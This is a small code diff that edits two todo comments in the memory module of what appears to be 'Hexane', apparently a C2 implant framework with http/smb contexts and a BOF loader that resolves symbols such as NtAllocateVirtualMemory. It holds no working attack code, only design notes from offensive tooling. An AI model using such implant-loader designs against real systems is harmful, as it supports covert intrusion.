@@ -111,7 +111,7 @@ namespace Memory {
         }
 
         VOID ContextDestroy(_hexane* Ctx) {
-            // todo: needs expanded to destroy all strings (http/smb context + anything else)
+            // todo: ContextDestroy needs expanded to destroy all strings (http/smb context + anything else)
 
             auto free = Ctx->nt.RtlFreeHeap;
             auto heap = Ctx->heap;
@@ -276,7 +276,7 @@ namespace Memory {
             address = 1;
 
                 /*
-                 * todo: change cmd_map to func_map and add every function
+                 * todo: Finish BOF loader ResolveSymbol and GetInternalAddress
                  * ok, hear me out:
                  *      auto name = "__imp_NTDLL$NtAllocateVirtualMemory" or "__Hexane$OpenUserProcess"
                  *      map[string]string = strings.Split(name, "$")
